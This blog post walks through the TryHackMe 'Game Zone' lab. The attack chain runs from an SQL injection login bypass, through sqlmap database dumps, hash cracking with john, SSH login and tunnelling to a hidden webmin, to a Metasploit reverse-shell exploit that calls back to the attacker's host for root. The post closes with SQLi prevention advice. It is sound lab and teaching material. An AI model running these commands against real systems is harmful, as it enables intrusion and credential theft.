---
title: "tryhackme: game zone"
date: 2021-10-26T17:21:48+04:00
draft: false
tags:
  - cybersec
  - tryhackme
  - walkthrough
  - pentesting
  - sql
---

this is a walkthrough for the room "game zone" on tryhackme. this was the 4th room in the "advanced exploitation" chapter, part of the "offensive pentesting" path. 

i liked this room because i like sql (yes, i know). database security is a very important component of cybersecurity, as databases are used in almost every type of modern organization. at the end of the walkthrough, i'll also include a link to a resource about preventing database attacks. 


tun0 IP address: 10.9.6.194
target IP address: 10.10.141.141

the first thing i always do, is to get an nmap scan going on the target. while that's running, i try to visit the IP address, in case it's a web page. 

the nmap scan:
```
nmap -sV -Pn 10.10.141.141 -v -T4
```
i want a very quick, one shot enumeration of the open ports and what services they are running. 

keep in mind that i'm not doing a UDP scan on this network. from my experience, they usually don't bring any more information. rarely, you might discover and have to use some open UDP ports.

visiting the IP address takes us to a website. 

![landing page](/static/landingpage.png)

the first question of the room is:

> What is the name of the large cartoon avatar holding a sniper on the forum?

i just happen to know the name of this character. if you don't, you can download the image and do a reverse image search. the search will lead you to the name of the video game: hitman. if you google hitman, you'll know the name of the protagonist (the dude in the photo) is Agent 47.


let's check back on our nmap scan.

![nmap](/static/nmap1.png)

we have 2 open ports, according to this scan: port 22 (SSH) and port 80 (HTTP). port 80 is obviously the website. let's dig around on the website a bit more.


as we can see on the landing page, there's a login form. we have 2 options here: either try to use SQL injection (sqli), or try to brute force the login form if sqli is not possible.

a login SQL query usually looks something like:

```sql
SELECT * FROM users WHERE username = "user" AND password = "pass"
```

what this query tries to do, is select the database table "users" and login with the credentials user:pass.

SQLi can be used to break the query. this is usually done by using a string termination character (') along with a true boolean statement:
```sql
' OR 1=1 -- -
```

it's usually some variation of the above. the dashes at the end indicate the start of a comment, which in this case would comment out the rest of the query.

for example, if you entered "admin" as the username, and "' OR 1=1 -- -" as the password, our query would become:

```sql
SELECT * FROM users where username = admin AND password = ' OR 1=1 -- -
```


in a weak system that didn't sanitize user input, this would break the login query and log us in as admin, because the password is **always true**.
let's try to login, but let's set the username as "' OR 1=1 -- -"

it worked! the site took us to a page called "portal.php".

![portal](/static/portal.png)

it seems to be a form where you can search for a game review. hitting search with no game in the field shows us a list of the game reviews on the database.

![portal2](/static/portal2.png)


let's try to search for a game and intercept the request in burp suite. we'll save the request as a text file, then feed it to sqlmap (an automated SQLi attack tool).

the intercepted request:

![burp](/static/burp.png)

i saved the request as burp.txt.


in sqlmap, we can use the command:

```
sqlmap -r burp.txt --dbms=mysql --dump
```

what this will do is dump the contents of the entire database. this can be a very noisy operation, so i'd advise against it.
the more stealthy approach is to dump the info in little parts, starting with the databases, then the tables inside the databases, and finally the contents of the tables. 

```
sqlmap -r burp.txt --dbms=mysql --dbs
```

![databases](/static/databases.png)

we can see 5 databases. "information_schema" and "performance_schema" are usually default generated databases, so let's focus on the database "db".

```
sqlmap -r burp.txt --dbms=mysql -D db --tables
```

![tables](/static/tables.png)

there are 2 tables: post and users. obviously, you want to dump the contents of the user table to see if there are any hashes or plaintext passwords (rare) stored.

```
sqlmap -r burp.txt --dbms=mysql -D db -T users --dump
```

![hash](/static/hash.png)

there's a user (agent47), along with their password hash (ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14).


what can we do with this hash? well, we can crack it! to crack it, you can either use john the ripper or hashcat. for this example, let's use john. before we do that though, we need to identify the hash. there are a variety of ways to identify hashes. you can either use an online hash identifier, like the one on [hashes.com](https://hashes.com/en/tools/hash_identifier), or you can tell from experience if you've been exposed to hashes in the past. i just happen to know that this is a SHA256 hash, so let's work on cracking it with john. first, save the hash to a file.

```
john agent47.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
```

![john](/static/john.png)

since i've already performed this crack, the result has been cached and pops up right away for me. normally, you will have to wait a while as john proceeds through the wordlists provided. hashcat might be a better option in some cases, as it can harness your GPU's CUDA cores and crack the hashes a lot faster.


so we now have the credentials agent47:videogamer124. what can we do with this information? if you remember the nmap scan at the beginning, there was an SSH service running on port 22. let's attempt to SSH into agent47's machine.

```
ssh agent47@10.10.141.141
```

![user_flag](/static/userflag.png)


we got our first flag! sweet. so, what now? in most cases, an attacker won't simply stop here. the primary goal of an attacker is to gain root/admin access. 


in the case of web applications like game zone, some services may be hidden behind firewalls. in some networks too, some websites may be blocked. what we can do in that case, is to create a reverse SSH tunnel that forwards the blocked traffic to a server that we own, then view it. -L is a local tunnel (YOU <- CLIENT).

first, we have to see the sockets that are running on a host. 
from inside the SSH terminal:

```
ss -tulpn
```

-t displays TCP sockets, -u displays UDP sockets, -l displays listening sockets, -p displays the process using the socket, -n makes sure the hostnames aren't resolved.

![sockets](/static/tulpn.png)

we can see that there's a service running on port 10000. the service is hidden, meaning it's probably behind a firewall rule. since we're not root, we can't modify the iptables list. let's create a reverse SSH tunnel and make the service visible to us. on our local machine, run:

```
ssh -L 10000:localhost:10000 agent47@10.10.141.141
```

if you visit localhost:10000 in a browser, you'll now see the webmin login page that was previously hidden.

![webmin](/static/webminlogin.png)


try logging in with agent47:videogamer124. 

it works! and we can see some system information about the service.

![webmin_info](/static/webmininfo.png)

the most important thing here is the webmin version: 1.580. we can use this information to search for an exploit relating to this exact version. i like to use searchsploit, because we're going to use metasploit, but you can use google or any other exploit database to find it.

![searchsploit](/static/searchsploit.png)


we're going to use the first result: /file/show.cgi Remote Command Execution. this exploits an arbitrary command execution vulnerability in our version of webmin. the vulnerability exists in /file/show.cgi and will allow an authenticated user (agent47) to execute arbitrary commands with root privileges. 

fire up msfconsole, and search for this exploit.

![msfconsole](/static/msfconsole.png)

now, let's configure our exploit.

```
set payload cmd/unix/reverse
set PASSWORD videogamer124
set USERNAME agent47
set RHOSTS localhost
set SSL false
set LHOST 10.9.6.194
set LPORT 4444
run
```

if the exploit is successful, we'll get a shell. remember, the reverse ssh tunnel needs to be running for this exploit to work. when you get the shell, upgrade to a proper shell by typing ```shell```. we'll be in the /usr/share/webmin/file directory, and the root flag is stored at /root/root.txt.

![root](static/root.png)


so there it is. we used SQLi to get initial, low privilege access to the network. after some poking around and reverse SSH tunneling, we discovered a CMS called webmin, that had a pretty neat little exploit specific to its version.


how can we prevent SQLi and the host of issues it can open up a private network to? 

1. input validation
2. parametrized queries
3. stored procedures
4. escaping
5. avoiding administrative privileges
6. web application firewalls (WAF)

[this](https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/) article from ptsecurity breaks down the above prevention methods quite well, and everyone working with databases that contain loads of secure data would be well advised to follow them!

